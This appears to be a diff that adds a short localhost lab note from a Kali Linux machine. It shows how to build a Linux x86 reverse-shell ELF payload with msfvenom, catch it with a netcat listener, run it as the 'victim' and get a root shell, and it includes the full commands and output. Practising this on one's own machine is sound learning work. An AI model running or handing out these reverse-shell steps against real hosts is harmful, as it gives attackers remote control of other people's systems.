@@ -1,0 +1,25 @@
+MSFVENOM to NC Reverse 
+This is a test on the localhost.  Kali Linux 32bit
+All terminals are on the same machine.
+
+Terminal 1 - the attacker terminal
+  nc -lvp 4444
+
+Terminal 2 - the build terminal 
+  msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f elf -o ~/linux_rs_4444
+  chmod +x linux_rs_4444
+
+Terminal 3 - the victim terminal
+  ./linux_rs_4444
+  
+Terminal 1 - the attacker terminal (OUTPUT)
+  listening on [any] 4444 ...
+  connect to [127.0.0.1] from localhost [127.0.0.1] 52040
+
+Terminal 1 - the attacker terminal
+  whoami
+
+Terminal 1 - the attacker terminal (OUTPUT)
+  root
+
+  
